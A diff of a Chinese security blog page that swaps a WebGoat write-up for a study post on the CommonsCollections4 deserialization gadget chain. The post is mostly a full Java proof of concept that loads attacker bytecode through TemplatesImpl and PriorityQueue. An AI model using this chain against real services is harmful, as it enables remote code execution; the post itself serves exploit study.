@@ -4,12 +4,15 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="WebGoat01-General, Troy3e">
-    <meta name="description" content="简介WebGoat是一个故意的不安全应用，让感兴趣的开发者在基于Java的热门开源应用上测试漏洞。
-安装：
-GeneralHTTP Basics1、HttpBasics
-2、HttpBasicsLesson
-3、HttpBasicsQuiz">
+    <meta name="keywords" content="CC链5-CommonsCollections4利用链分析, Troy3e">
+    <meta name="description" content="环境
+JDK8u65
+openJDK 8u65
+Maven 3.6.3
+Commons-Collections 4.0
+
+&amp;lt;dependency&gt;  
+ &amp;lt;groupId&gt;org.apache.commons&amp;lt;/group">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -21,7 +24,7 @@ GeneralHTTP Basics1、HttpBasics
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>WebGoat01-General | Troy3e</title>
+    <title>CC链5-CommonsCollections4利用链分析 | Troy3e</title>
     <link rel="icon" type="image/png" href="https://cdn.jsdelivr.net/gh/ITroyeSivan/ITroyeSivan.github.io/favicon.png">
     
     <style>
@@ -270,12 +273,12 @@ GeneralHTTP Basics1、HttpBasics
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/202311041640695.png')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/202312081702102.png')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">WebGoat01-General</h1>
+                    <h1 class="description center-align post-title">CC链5-CommonsCollections4利用链分析</h1>
                 </div>
             </div>
         </div>
@@ -303,10 +306,6 @@ GeneralHTTP Basics1、HttpBasics
                                 <span class="chip bg-color">JavaSec</span>
                             </a>
                         
-                            <a href="/tags/WebGoat/">
-                                <span class="chip bg-color">WebGoat</span>
-                            </a>
-                        
                     </div>
                     
                 </div>
@@ -328,7 +327,7 @@ GeneralHTTP Basics1、HttpBasics
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2023-11-04
+                    2023-12-08
                 </div>
                 
 
@@ -337,14 +336,14 @@ GeneralHTTP Basics1、HttpBasics
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    457
+                    381
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    2 分
                 </div>
                 
 
@@ -367,24 +366,86 @@ GeneralHTTP Basics1、HttpBasics
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>WebGoat是一个故意的不安全应用，让感兴趣的开发者在基于Java的热门开源应用上测试漏洞。</p>
-<p>安装：<img src="https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/202311041447881.png" alt="image-20231104144745792"></p>
-<h1 id="General"><a href="#General" class="headerlink" title="General"></a>General</h1><h2 id="HTTP-Basics"><a href="#HTTP-Basics" class="headerlink" title="HTTP Basics"></a>HTTP Basics</h2><h3 id="1、HttpBasics"><a href="#1、HttpBasics" class="headerlink" title="1、HttpBasics"></a>1、HttpBasics</h3><p><img src="https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/202310312147357.png"></p>
-<h3 id="2、HttpBasicsLesson"><a href="#2、HttpBasicsLesson" class="headerlink" title="2、HttpBasicsLesson"></a>2、HttpBasicsLesson</h3><p><img src="https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/202310312153656.png"></p>
-<h3 id="3、HttpBasicsQuiz"><a href="#3、HttpBasicsQuiz" class="headerlink" title="3、HttpBasicsQuiz"></a>3、HttpBasicsQuiz</h3><p>查看源码：</p>
-<p><img src="https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/202310312154070.png"></p>
-<p>显然，需要POST方式并且magic_answer等于magic_num.抓包修改即可：</p>
-<p><img src="https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/202310312201155.png"></p>
-<h2 id="HTTP-Proxies"><a href="#HTTP-Proxies" class="headerlink" title="HTTP Proxies"></a>HTTP Proxies</h2><p>代理是将HTTP客户端连接到后端资源的转发器应用程序。HTTP客户端可以是浏览器或应用程序，如curl、SOAP UI、Postman等。通常，当客户端本身没有直接连接到互联网时，这些代理用于路由和获取互联网访问。因此，在测试应用程序时，HTTP代理也是理想的。您始终可以使用代理日志记录来查看从客户端到服务器的实际发送内容。因此，您可以检查请求和响应头以及XML、JSON或其他有效负载。</p>
-<p>HTTP代理从客户端接收请求并中继它们。他们通常也会记录它们。他们充当中间人。它甚至可以在有或没有HTTPS的情况下正常工作，只要您的客户端或浏览器信任HTTP代理的证书。</p>
-<p>前几步都是教你怎么装ZAP，因为用惯Burp就不装了，直接跳过。</p>
-<h3 id="1、Lesson5"><a href="#1、Lesson5" class="headerlink" title="1、Lesson5"></a>1、Lesson5</h3><p><img src="https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/202311041533893.png"></p>
-<p>POST改GET，加个请求头，再改一下参数即可。</p>
-<h2 id="Developer-Tools"><a href="#Developer-Tools" class="headerlink" title="Developer Tools"></a>Developer Tools</h2><p>教你如何使用F12。</p>
-<h2 id="CIA-Triad"><a href="#CIA-Triad" class="headerlink" title="CIA Triad"></a>CIA Triad</h2><p>CIA Triad（机密性、完整性、可用性）是信息安全的一个模型。三元组的三个元素被认为是最关键的信息安全组件，应在任何安全系统中予以保证。</p>
-<p>即使违反其中一个要素，也可能造成严重后果。</p>
-<p>创建CIA Triad是为了提供评估和实施安全性的基线标准，而不管底层系统和&#x2F;或组织如何。</p>
-<h2 id="Writing-new-lesson"><a href="#Writing-new-lesson" class="headerlink" title="Writing new lesson"></a>Writing new lesson</h2><p>略。</p>
+                <h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><ul>
+<li><a target="_blank" rel="noopener" href="https://www.oracle.com/cn/java/technologies/javase/javase8-archive-downloads.html">JDK8u65</a></li>
+<li><a target="_blank" rel="noopener" href="http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/af660750b2f4">openJDK 8u65</a></li>
+<li>Maven 3.6.3</li>
+<li>Commons-Collections 4.0</li>
+</ul>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token generics"><span class="token punctuation">&lt;</span>dependency<span class="token punctuation">></span></span>  
+ <span class="token generics"><span class="token punctuation">&lt;</span>groupId<span class="token punctuation">></span></span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token operator">&lt;</span><span class="token operator">/</span>groupId<span class="token operator">></span>  
+ <span class="token generics"><span class="token punctuation">&lt;</span>artifactId<span class="token punctuation">></span></span>commons<span class="token operator">-</span>collections4<span class="token operator">&lt;</span><span class="token operator">/</span>artifactId<span class="token operator">></span>  
+ <span class="token generics"><span class="token punctuation">&lt;</span>version<span class="token punctuation">></span></span><span class="token number">4.0</span><span class="token operator">&lt;</span><span class="token operator">/</span>version<span class="token operator">></span>  
+<span class="token operator">&lt;</span><span class="token operator">/</span>dependency<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h1 id="CC4"><a href="#CC4" class="headerlink" title="CC4"></a>CC4</h1><p>看一下ysoserial给的利用链：</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/*
+ * Variation on CommonsCollections2 that uses InstantiateTransformer instead of
+ * InvokerTransformer.
+ */</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>CC4似乎只是CC2使用了CC3中的InstantiateTransformer。</p>
+<p>突然发现之前CC2的博客考虑过这种方案了。。。：</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TemplatesImpl</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TrAXFilter</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TransformerFactoryImpl</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span></span><span class="token class-name">Transformer</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ChainedTransformer</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ConstantTransformer</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InstantiateTransformer</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>comparators<span class="token punctuation">.</span></span><span class="token class-name">TransformingComparator</span></span><span class="token punctuation">;</span>
+
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>transform<span class="token punctuation">.</span></span><span class="token class-name">Templates</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ByteArrayInputStream</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ByteArrayOutputStream</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectInputStream</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectOutputStream</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Files</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Paths</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Comparator</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">PriorityQueue</span></span><span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CC2_TemplatesImpl_8u65</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">setFiledValue</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">,</span> <span class="token class-name">String</span> fieldName<span class="token punctuation">,</span> <span class="token class-name">Object</span> fieldValue<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
+        <span class="token class-name">Field</span> field <span class="token operator">=</span> obj<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span>fieldName<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        field<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        field<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> fieldValue<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>
+        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> codes <span class="token operator">=</span> <span class="token class-name">Files</span><span class="token punctuation">.</span><span class="token function">readAllBytes</span><span class="token punctuation">(</span><span class="token class-name">Paths</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"E:\\研究生\\JavaSec\\code\\target\\classes\\Calc.class"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> _bytecodes <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span>codes<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+        <span class="token class-name">TemplatesImpl</span> templates <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TemplatesImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">setFiledValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> <span class="token string">"_bytecodes"</span><span class="token punctuation">,</span> _bytecodes<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">setFiledValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> <span class="token string">"_name"</span><span class="token punctuation">,</span> <span class="token string">"whatever"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">setFiledValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> <span class="token string">"_tfactory"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">TransformerFactoryImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> faketransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span></span>Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span>
+                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">TrAXFilter</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+                <span class="token keyword">new</span> <span class="token class-name">InstantiateTransformer</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">Templates</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>templates<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+        <span class="token class-name">Transformer</span> transformerChain <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>faketransformer<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">Comparator</span> transformingcomparator <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TransformingComparator</span><span class="token punctuation">(</span>transformerChain<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">PriorityQueue</span> priorityQueue <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PriorityQueue</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>transformingcomparator<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        priorityQueue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        priorityQueue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token class-name">Field</span> f <span class="token operator">=</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"iTransformers"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        f<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        f<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>transformerChain<span class="token punctuation">,</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token class-name">ByteArrayOutputStream</span> barr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">ObjectOutputStream</span> oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>barr<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>priorityQueue<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        oos<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>barr<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">ObjectInputStream</span> ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>barr<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">Object</span> o <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Object</span><span class="token punctuation">)</span>ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>狠狠水一篇。</p>
 
                 
             </div>
@@ -411,7 +472,7 @@ GeneralHTTP Basics1、HttpBasics
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://itroyesivan.github.io/2023/11/04/webgoat01-general/">https://itroyesivan.github.io/2023/11/04/webgoat01-general/</a>
+                    <a href="https://itroyesivan.github.io/2023/12/08/cc-lian-5-commonscollections4-li-yong-lian-fen-xi/">https://itroyesivan.github.io/2023/12/08/cc-lian-5-commonscollections4-li-yong-lian-fen-xi/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -451,10 +512,6 @@ GeneralHTTP Basics1、HttpBasics
                             
                                 <a href="/tags/JavaSec/">
                                     <span class="chip bg-color">JavaSec</span>
-                                </a>
-                            
-                                <a href="/tags/WebGoat/">
-                                    <span class="chip bg-color">WebGoat</span>
                                 </a>
                             
                         </div>
@@ -504,12 +561,12 @@ GeneralHTTP Basics1、HttpBasics
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2023/11/07/urldns-lian-fen-xi/">
+                <a href="/2023/12/08/cc-lian-4-commonscollections2-li-yong-lian-fen-xi/">
                     <div class="card-image">
                         
-                        <img src="https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/202311072059335.png" class="responsive-img" alt="URLDNS链分析">
+                        <img src="https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/202312081702824.jpeg" class="responsive-img" alt="CC链4-CommonsCollections2利用链分析">
                         
-                        <span class="card-title">URLDNS链分析</span>
+                        <span class="card-title">CC链4-CommonsCollections2利用链分析</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -520,7 +577,7 @@ GeneralHTTP Basics1、HttpBasics
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2023-11-07
+                            <i class="far fa-clock fa-fw icon-date"></i>2023-12-08
                         </span>
                         <span class="publish-author">
                             
@@ -552,12 +609,12 @@ GeneralHTTP Basics1、HttpBasics
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2023/11/03/javasec-ji-chu-04-fan-xu-lie-hua/">
+                <a href="/2023/12/06/cc-lian-3-commonscollections3-li-yong-lian-fen-xi/">
                     <div class="card-image">
                         
-                        <img src="https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/202311031949810.jpeg" class="responsive-img" alt="JavaSec基础04-反序列化">
+                        <img src="https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/202312061955139.jpeg" class="responsive-img" alt="CC链3-CommonsCollections3利用链分析">
                         
-                        <span class="card-title">JavaSec基础04-反序列化</span>
+                        <span class="card-title">CC链3-CommonsCollections3利用链分析</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -568,7 +625,7 @@ GeneralHTTP Basics1、HttpBasics
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2023-11-03
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-12-06
                             </span>
                         <span class="publish-author">
                             
